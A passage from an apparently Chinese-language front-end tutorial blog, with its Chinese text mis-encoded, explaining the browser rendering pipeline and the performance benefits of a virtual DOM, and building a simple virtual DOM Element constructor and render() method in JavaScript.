ç»˜åˆ¶ <code>Painting</code>ã€‚</p><ul><li><p>ç¬¬ä¸€æ­¥ï¼Œæ„å»º DOM æ ‘ï¼šå½“æµè§ˆå™¨æ¥æ”¶åˆ°æ¥è‡ªæœåŠ¡å™¨å“åº”çš„HTMLæ–‡æ¡£åï¼Œä¼šéå†æ–‡æ¡£èŠ‚ç‚¹ï¼Œç”ŸæˆDOMæ ‘ã€‚éœ€è¦æ³¨æ„çš„æ˜¯åœ¨DOMæ ‘ç”Ÿæˆçš„è¿‡ç¨‹ä¸­æœ‰å¯èƒ½ä¼šè¢«CSSå’ŒJSçš„åŠ è½½æ‰§è¡Œé˜»å¡ï¼Œæ¸²æŸ“é˜»å¡ä¸‹é¢ä¼šè®²åˆ°ã€‚</p></li><li><p>ç¬¬äºŒæ­¥ï¼Œç”Ÿæˆæ ·å¼è¡¨ï¼šç”¨ CSS åˆ†æå™¨ï¼Œåˆ†æ CSS æ–‡ä»¶å’Œå…ƒç´ ä¸Šçš„ inline æ ·å¼ï¼Œç”Ÿæˆé¡µé¢çš„æ ·å¼è¡¨ï¼›</p></li><li><p>æ¸²æŸ“é˜»å¡ï¼šå½“æµè§ˆå™¨é‡åˆ°ä¸€ä¸ªscriptæ ‡ç­¾æ—¶ï¼ŒDOMæ„å»ºå°†æš‚åœï¼Œç›´åˆ°è„šæœ¬åŠ è½½æ‰§è¡Œï¼Œç„¶åç»§ç»­æ„å»ºDOMæ ‘ã€‚æ¯æ¬¡å»æ‰§è¡ŒJavascriptè„šæœ¬éƒ½ä¼šä¸¥é‡é˜»å¡DOMæ ‘æ„å»ºï¼Œå¦‚æœJavaScriptè„šæœ¬è¿˜æ“ä½œäº†CSSOMï¼Œè€Œæ­£å¥½è¿™ä¸ªCSSOMæ²¡æœ‰ä¸‹è½½å’Œæ„å»ºï¼Œé‚£ä¹ˆæµè§ˆå™¨ç”šè‡³ä¼šå»¶è¿Ÿè„šæœ¬æ‰§è¡Œå’Œæ„å»ºDOMï¼Œç›´åˆ°è¿™ä¸ªCSSOMçš„ä¸‹è½½å’Œæ„å»ºã€‚æ‰€ä»¥ï¼Œscriptæ ‡ç­¾å¼•å…¥å¾ˆé‡è¦ï¼Œå®é™…ä½¿ç”¨æ—¶å¯ä»¥éµå¾ªä¸‹é¢ä¸¤ä¸ªåŸåˆ™ï¼š</p><ul><li><p>cssä¼˜å…ˆï¼šå¼•å…¥é¡ºåºä¸Šï¼Œcssèµ„æºå…ˆäºjsèµ„æº</p></li><li><p>jsåç½®ï¼šjsä»£ç æ”¾åœ¨åº•éƒ¨ï¼Œä¸”jsåº”å°½é‡å°‘å½±å“DOMæ„å»º</p></li></ul></li></ul><blockquote><p>è¿˜æœ‰ä¸€ä¸ªå°çŸ¥è¯†ï¼šå½“è§£æhtmlæ—¶ï¼Œä¼šæŠŠæ–°æ¥çš„å…ƒç´ æ’å…¥domæ ‘é‡Œï¼ŒåŒæ—¶å»æŸ¥æ‰¾cssï¼Œç„¶åæŠŠå¯¹åº”çš„æ ·å¼è§„åˆ™åº”ç”¨åˆ°å…ƒç´ ä¸Šï¼ŒæŸ¥æ‰¾æ ·å¼è¡¨æ˜¯æŒ‰ç…§ä»å³åˆ°å·¦çš„é¡ºåºåŒ¹é…çš„ä¾‹å¦‚ï¼šdiv p {â€¦}ï¼Œä¼šå…ˆå¯»æ‰¾æ‰€æœ‰pæ ‡ç­¾å¹¶åˆ¤æ–­å®ƒçš„çˆ¶æ ‡ç­¾æ˜¯å¦ä¸ºdivä¹‹åæ‰å†³å®šè¦ä¸è¦é‡‡ç”¨è¿™ä¸ªæ ·å¼æ¸²æŸ“ã€‚æ‰€ä»¥å¹³æ—¶å†™csså°½é‡ç”¨classæˆ–è€…idï¼Œä¸è¦è¿‡åº¦å±‚å </p></blockquote><ul><li><p>ç¬¬ä¸‰æ­¥ï¼Œæ„å»ºæ¸²æŸ“æ ‘ï¼šé€šè¿‡DOMæ ‘å’ŒCSSè§„åˆ™æˆ‘ä»¬å¯ä»¥æ„å»ºæ¸²æŸ“æ ‘ã€‚æµè§ˆå™¨ä¼šä»DOMæ ‘æ ¹èŠ‚ç‚¹å¼€å§‹éå†æ¯ä¸ªå¯è§èŠ‚ç‚¹(æ³¨æ„æ˜¯å¯è§èŠ‚ç‚¹)å¯¹æ¯ä¸ªå¯è§èŠ‚ç‚¹ï¼Œæ‰¾åˆ°å…¶é€‚é…çš„CSSè§„åˆ™å¹¶åº”ç”¨ã€‚æ¸²æŸ“æ ‘æ„å»ºå®Œåï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯å¯è§èŠ‚ç‚¹å¹¶ä¸”éƒ½å«æœ‰å…¶å†…å®¹å’Œå¯¹åº”çš„è§„åˆ™çš„æ ·å¼ã€‚è¿™ä¹Ÿæ˜¯æ¸²æŸ“æ ‘å’ŒDOMæ ‘æœ€å¤§çš„åŒºåˆ«æ‰€åœ¨ã€‚æ¸²æŸ“æ˜¯ç”¨äºæ˜¾ç¤ºï¼Œé‚£äº›ä¸å¯è§çš„å…ƒç´ å°±ä¸ä¼šåœ¨è¿™æ£µæ ‘å‡ºç°äº†ã€‚é™¤æ­¤ä»¥å¤–ï¼Œdisplay noneçš„å…ƒç´ ä¹Ÿä¸ä¼šè¢«æ˜¾ç¤ºåœ¨è¿™æ£µæ ‘é‡Œã€‚visibility hiddençš„å…ƒç´ ä¼šå‡ºç°åœ¨è¿™æ£µæ ‘é‡Œã€‚</p></li><li><p>ç¬¬å››æ­¥ï¼Œ <strong>æ¸²æŸ“å¸ƒå±€</strong> ï¼šå¸ƒå±€é˜¶æ®µä¼šä»æ¸²æŸ“æ ‘çš„æ ¹èŠ‚ç‚¹å¼€å§‹éå†ï¼Œç„¶åç¡®å®šæ¯ä¸ªèŠ‚ç‚¹å¯¹è±¡åœ¨é¡µé¢ä¸Šçš„ç¡®åˆ‡å¤§å°ä¸ä½ç½®ï¼Œå¸ƒå±€é˜¶æ®µçš„è¾“å‡ºæ˜¯ä¸€ä¸ªç›’å­æ¨¡å‹ï¼Œå®ƒä¼šç²¾ç¡®åœ°æ•è·æ¯ä¸ªå…ƒç´ åœ¨å±å¹•å†…çš„ç¡®åˆ‡ä½ç½®ä¸å¤§å°ã€‚</p></li><li><p>ç¬¬äº”æ­¥ï¼Œ <strong>æ¸²æŸ“æ ‘ç»˜åˆ¶</strong> ï¼šåœ¨ç»˜åˆ¶é˜¶æ®µï¼Œéå†æ¸²æŸ“æ ‘ï¼Œè°ƒç”¨æ¸²æŸ“å™¨çš„paint()æ–¹æ³•åœ¨å±å¹•ä¸Šæ˜¾ç¤ºå…¶å†…å®¹ã€‚æ¸²æŸ“æ ‘çš„ç»˜åˆ¶å·¥ä½œæ˜¯ç”±æµè§ˆå™¨çš„UIåç«¯ç»„ä»¶å®Œæˆçš„ã€‚</p></li></ul><p><strong>æ³¨æ„ç‚¹ ï¼š</strong></p><p><strong>1ã€<code>DOM</code> æ ‘çš„æ„å»ºæ˜¯æ–‡æ¡£åŠ è½½å®Œæˆå¼€å§‹çš„ï¼Ÿ</strong> </p><p>æ„å»º <code>DOM</code>æ ‘æ˜¯ä¸€ä¸ªæ¸è¿›è¿‡ç¨‹ï¼Œä¸ºè¾¾åˆ°æ›´å¥½çš„ç”¨æˆ·ä½“éªŒï¼Œæ¸²æŸ“å¼•æ“ä¼šå°½å¿«å°†å†…å®¹æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œå®ƒä¸å¿…ç­‰åˆ°æ•´ä¸ª <code>HTML</code> æ–‡æ¡£è§£æå®Œæˆä¹‹åæ‰å¼€å§‹æ„å»º <code>render</code>æ ‘å’Œå¸ƒå±€ã€‚</p><p><strong>2ã€<code>Render</code> æ ‘æ˜¯ <code>DOM</code> æ ‘å’Œ <code>CSS</code> æ ·å¼è¡¨æ„å»ºå®Œæ¯•åæ‰å¼€å§‹æ„å»ºçš„ï¼Ÿ</strong><br>è¿™ä¸‰ä¸ªè¿‡ç¨‹åœ¨å®é™…è¿›è¡Œçš„æ—¶å€™å¹¶ä¸æ˜¯å®Œå…¨ç‹¬ç«‹çš„ï¼Œè€Œæ˜¯ä¼šæœ‰äº¤å‰ï¼Œä¼šä¸€è¾¹åŠ è½½ï¼Œä¸€è¾¹è§£æï¼Œä»¥åŠä¸€è¾¹æ¸²æŸ“ã€‚</p><p><strong>3ã€<code>CSS</code> çš„è§£ææ³¨æ„ç‚¹ï¼Ÿ</strong> </p><p><code>CSS</code> çš„è§£ææ˜¯ä»&#x3D;&#x3D;å³å¾€å·¦é€†å‘&#x3D;&#x3D;è§£æçš„ï¼ŒåµŒå¥—æ ‡ç­¾è¶Šå¤šï¼Œè§£æè¶Šæ…¢ã€‚</p><p><strong>4ã€<code>JS</code> æ“ä½œçœŸå® <code>DOM</code>çš„ä»£ä»·ï¼Ÿ</strong></p><p>ä¼ ç»ŸDOMç»“æ„æ“ä½œæ–¹å¼å¯¹æ€§èƒ½çš„å½±å“å¾ˆå¤§ï¼ŒåŸå› æ˜¯é¢‘ç¹æ“ä½œDOMç»“æ„æ“ä½œä¼šå¼•èµ·é¡µé¢çš„é‡æ’(reflow)å’Œé‡ç»˜(repaint)ï¼Œæµè§ˆå™¨ä¸å¾—ä¸é¢‘ç¹åœ°è®¡ç®—å¸ƒå±€ï¼Œé‡æ–°æ’åˆ—å’Œç»˜åˆ¶é¡µé¢å…ƒç´ ï¼Œå¯¼è‡´æµè§ˆå™¨äº§ç”Ÿå·¨å¤§çš„æ€§èƒ½å¼€é”€ã€‚ç›´æ¥æ“ä½œçœŸå®<code>DOM</code>çš„æ€§èƒ½ç‰¹åˆ«å·®ï¼Œæˆ‘ä»¬å¯ä»¥æ¥æ¼”ç¤ºä¸€éã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// è·å– DIV å…ƒç´ </span></span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> box = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#app&#x27;</span>);</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(box);</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// çœŸå® DOM æ“ä½œ</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;a&#x27;</span>);</span><br><span class="language-javascript">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">10000</span>; i++) &#123;</span><br><span class="language-javascript">        box.<span class="hljs-property">innerHTML</span> = i;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;a&#x27;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// è™šæ‹Ÿ DOM æ“ä½œ</span></span><br><span class="language-javascript">    <span class="hljs-keyword">let</span> num = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;b&#x27;</span>);</span><br><span class="language-javascript">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">10000</span>; i++) &#123;</span><br><span class="language-javascript">        num = i;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    box.<span class="hljs-property">innerHTML</span> = num;</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;b&#x27;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124112747639.png" alt="image-20221124112747639" style="zoom: 80%;" /><blockquote><p>ä»ç»“æœä¸­å¯ä»¥çœ‹å‡ºï¼Œæ“ä½œçœŸå® DOM çš„æ€§èƒ½æ˜¯éå¸¸å·®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°½å¯èƒ½çš„å¤ç”¨ï¼Œå‡å°‘ DOM æ“ä½œã€‚</p></blockquote><h4 id="è™šæ‹Ÿ-DOM-çš„å¥½å¤„"><a href="#è™šæ‹Ÿ-DOM-çš„å¥½å¤„" class="headerlink" title="è™šæ‹Ÿ DOM çš„å¥½å¤„"></a><strong>è™šæ‹Ÿ DOM çš„å¥½å¤„</strong></h4><p> è™šæ‹Ÿ <code>DOM</code> å°±æ˜¯ä¸ºäº†è§£å†³æµè§ˆå™¨æ€§èƒ½é—®é¢˜è€Œè¢«è®¾è®¡å‡ºæ¥çš„ã€‚å¦‚å‰ï¼Œè‹¥ä¸€æ¬¡æ“ä½œä¸­æœ‰ 10 æ¬¡æ›´æ–° <code>DOM</code> çš„åŠ¨ä½œï¼Œè™šæ‹Ÿ <code>DOM</code> ä¸ä¼šç«‹å³æ“ä½œ<code>DOM</code>ï¼Œè€Œæ˜¯å°†è¿™ 10 æ¬¡æ›´æ–°çš„ <code>diff</code> å†…å®¹ä¿å­˜åˆ°æœ¬åœ°ä¸€ä¸ª <code>JS</code> å¯¹è±¡ä¸­ï¼Œæœ€ç»ˆå°†è¿™ä¸ª <code>JS</code> å¯¹è±¡ä¸€æ¬¡æ€§ <code>attch</code> åˆ° <code>DOM</code>æ ‘ä¸Šï¼Œå†è¿›è¡Œåç»­æ“ä½œï¼Œé¿å…å¤§é‡æ— è°“çš„è®¡ç®—é‡ã€‚æ‰€ä»¥ï¼Œç”¨ <code>JS</code> å¯¹è±¡æ¨¡æ‹Ÿ <code>DOM</code> èŠ‚ç‚¹çš„å¥½å¤„æ˜¯ï¼Œé¡µé¢çš„æ›´æ–°å¯ä»¥å…ˆå…¨éƒ¨åæ˜ åœ¨ <code>JS</code> å¯¹è±¡(è™šæ‹Ÿ<br><code>DOM</code> )ä¸Šï¼Œæ“ä½œå†…å­˜ä¸­çš„ <code>JS</code> å¯¹è±¡çš„é€Ÿåº¦æ˜¾ç„¶è¦æ›´å¿«ï¼Œç­‰æ›´æ–°å®Œæˆåï¼Œå†å°†æœ€ç»ˆçš„ <code>JS</code> å¯¹è±¡æ˜ å°„æˆçœŸå®çš„ <code>DOM</code>ï¼Œäº¤ç”±æµè§ˆå™¨å»ç»˜åˆ¶ã€‚</p><p> è™½ç„¶è¿™ä¸€ä¸ªè™šæ‹Ÿ DOM å¸¦æ¥çš„ä¸€ä¸ªä¼˜åŠ¿ï¼Œä½†å¹¶ä¸æ˜¯å…¨éƒ¨ã€‚è™šæ‹Ÿ DOM æœ€å¤§çš„ä¼˜åŠ¿åœ¨äºæŠ½è±¡äº†åŸæœ¬çš„æ¸²æŸ“è¿‡ç¨‹ï¼Œå®ç°äº†è·¨å¹³å°çš„èƒ½åŠ›ï¼Œè€Œä¸ä»…ä»…å±€é™äºæµè§ˆå™¨çš„DOMï¼Œå¯ä»¥æ˜¯å®‰å“å’Œ IOS çš„åŸç”Ÿç»„ä»¶ï¼Œå¯ä»¥æ˜¯è¿‘æœŸå¾ˆç«çƒ­çš„å°ç¨‹åºï¼Œä¹Ÿå¯ä»¥æ˜¯å„ç§GUIã€‚</p><p> å›åˆ°æœ€å¼€å§‹çš„é—®é¢˜ï¼Œè™šæ‹Ÿ DOM åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œè¯´ç®€å•ç‚¹ï¼Œå°±æ˜¯ä¸€ä¸ªæ™®é€šçš„ JavaScript å¯¹è±¡ï¼ŒåŒ…å«äº†<br><code>tag</code>ã€<code>props</code>ã€<code>children</code> ä¸‰ä¸ªå±æ€§ã€‚</p><blockquote><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ‰‹åŠ¨å®ç°ä¸‹ è™šæ‹Ÿ DOMã€‚</p><p>åˆ†ä¸¤ç§å®ç°æ–¹å¼ï¼š</p><p>ä¸€ç§åŸç”Ÿ js DOM æ“ä½œå®ç°ï¼›</p><p>å¦ä¸€ç§ä¸»æµè™šæ‹Ÿ DOM åº“ï¼ˆsnabbdomã€virtual-domï¼‰çš„å®ç°ï¼ˆç”¨hå‡½æ•°æ¸²æŸ“ï¼‰ï¼ˆæš‚æ—¶è¿˜ä¸ç†è§£ï¼‰</p></blockquote><p><strong>ç®—æ³•å®ç°</strong></p><p><strong>ï¼ˆ1ï¼‰</strong>ç”¨ JS å¯¹è±¡æ¨¡æ‹Ÿ DOM æ ‘ï¼š</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;virtual-dom&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Virtual DOM<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;list&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;</span>Item 1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;</span>Item 2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;</span>Item 3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Hello World<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç”¨ <code>JavaScript</code> å¯¹è±¡æ¥è¡¨ç¤º <code>DOM</code> èŠ‚ç‚¹ï¼Œä½¿ç”¨å¯¹è±¡çš„å±æ€§è®°å½•èŠ‚ç‚¹çš„ç±»å‹ã€å±æ€§ã€å­èŠ‚ç‚¹ç­‰ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Element virdual-dom å¯¹è±¡å®šä¹‰</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">String</span>&#125; <span class="hljs-variable">tagName</span> - dom å…ƒç´ åç§°</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">Object</span>&#125; <span class="hljs-variable">props</span> - dom å±æ€§</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> &#123;<span class="hljs-type">Array&lt;Element|String&gt;</span>&#125; - å­èŠ‚ç‚¹</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Element</span>(<span class="hljs-params">tagName, props, children</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tagName</span> = tagName;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span> = props;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span> = children;<br>    <span class="hljs-comment">// dom å…ƒç´ çš„ key å€¼ï¼Œç”¨ä½œå”¯ä¸€æ ‡è¯†ç¬¦</span><br>    <span class="hljs-keyword">if</span> (props.<span class="hljs-property">key</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">key</span> = props.<span class="hljs-property">key</span><br>    &#125;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">el</span>(<span class="hljs-params">tagName, props, children</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Element</span>(tagName, props, children);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æ„å»ºè™šæ‹Ÿçš„ <code>DOM</code> ï¼Œç”¨ javascript å¯¹è±¡æ¥è¡¨ç¤º</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> ul = <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;div&#x27;</span>, &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;Virtual DOM&#x27;</span> &#125;, [<br>    <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;p&#x27;</span>, &#123;&#125;, [<span class="hljs-string">&#x27;Virtual DOM&#x27;</span>]),<br>    <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;ul&#x27;</span>, &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;list&#x27;</span> &#125;, [<br>        <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;li&#x27;</span>, &#123; <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;item&#x27;</span> &#125;, [<span class="hljs-string">&#x27;Item 1&#x27;</span>]),<br>        <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;li&#x27;</span>, &#123; <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;item&#x27;</span> &#125;, [<span class="hljs-string">&#x27;Item 2&#x27;</span>]),<br>        <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;li&#x27;</span>, &#123; <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;item&#x27;</span> &#125;, [<span class="hljs-string">&#x27;Item 3&#x27;</span>])<br>    ]),<br>    <span class="hljs-title function_">el</span>(<span class="hljs-string">&#x27;div&#x27;</span>, &#123;&#125;, [<span class="hljs-string">&#x27;Hello, World&#x27;</span>])<br>])<br><br></code></pre></td></tr></table></figure><p>ç°åœ¨ <code>ul</code> å°±æ˜¯æˆ‘ä»¬ç”¨ <code>JavaScript</code> å¯¹è±¡è¡¨ç¤ºçš„ <code>DOM</code> ç»“æ„ï¼Œæˆ‘ä»¬è¾“å‡ºæŸ¥çœ‹ <code>ul</code> å¯¹åº”çš„æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124113145388.png" alt="image-20221124113145388" style="zoom: 67%;" /><p><strong>ï¼ˆ2ï¼‰</strong>å°†ç”¨ js å¯¹è±¡è¡¨ç¤ºçš„è™šæ‹Ÿ DOM è½¬æ¢æˆçœŸå® DOMï¼šéœ€è¦ç”¨åˆ° js åŸç”Ÿæ“ä½œ DOM çš„æ–¹æ³•ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * render å°†virdual-dom å¯¹è±¡æ¸²æŸ“ä¸ºå®é™… DOM å…ƒç´ </span><br><span class="hljs-comment"> */</span><br><span class="hljs-title class_">Element</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">render</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// åˆ›å»ºèŠ‚ç‚¹</span><br>    <span class="hljs-keyword">let</span> el = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">tagName</span>);<br><br>    <span class="hljs-keyword">let</span> props = <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>;<br>    <span class="hljs-comment">// è®¾ç½®èŠ‚ç‚¹çš„ DOM å±æ€§</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> propName <span class="hljs-keyword">in</span> props) &#123;<br>        <span class="hljs-keyword">let</span> propValue = props[propName];<br>        el.<span class="hljs-title function_">setAttribute</span>(propName, propValue)<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> children = <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span> || []<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> child <span class="hljs-keyword">of</span> children) &#123;<br>        <span class="hljs-keyword">let</span> childEl = (child <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Element</span>)<br>        ? child.<span class="hljs-title function_">render</span>() <span class="hljs-comment">// å¦‚æœå­èŠ‚ç‚¹ä¹Ÿæ˜¯è™šæ‹Ÿ DOM, é€’å½’æ„å»º DOM èŠ‚ç‚¹</span><br>        : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(child) <span class="hljs-comment">// å¦‚æœæ˜¯æ–‡æœ¬ï¼Œå°±æ„å»ºæ–‡æœ¬èŠ‚ç‚¹</span><br><br>        el.<span class="hljs-title function_">appendChild</span>(childEl);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> el;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹ä»¥ä¸Š <code>render</code> æ–¹æ³•ï¼Œä¼šæ ¹æ® <code>tagName</code> æ„å»ºä¸€ä¸ªçœŸæ­£çš„ <code>DOM</code>èŠ‚ç‚¹ï¼Œç„¶åè®¾ç½®è¿™ä¸ªèŠ‚ç‚¹çš„å±æ€§ï¼Œæœ€åé€’å½’åœ°æŠŠè‡ªå·±çš„å­èŠ‚ç‚¹ä¹Ÿæ„å»ºèµ·æ¥ã€‚</p><p>æˆ‘ä»¬å°†æ„å»ºå¥½çš„ <code>DOM</code> ç»“æ„æ·»åŠ åˆ°é¡µé¢ <code>body</code> ä¸Šé¢ï¼Œå¦‚ä¸‹ï¼š</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> ulRoot = ul.<span class="hljs-title function_">render</span>();<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(ulRoot);<br><br></code></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œé¡µé¢ <code>body</code> é‡Œé¢å°±æœ‰çœŸæ­£çš„ <code>DOM</code> ç»“æ„ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124113734340.png" alt="image-20221124113734340" style="zoom:50%;" /><blockquote><p>æˆ‘ä»¬çŸ¥é“è™šæ‹Ÿ DOM çš„å¥½å¤„å’Œè™šæ‹Ÿ DOM çš„å®ç°åå°±è¦è®²è®² key çš„ä½œç”¨äº†ã€‚</p><p>è´´ä¸€ä¸‹ä¸Šé¢å®ç°åœ°å®Œæ•´ä»£ç </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 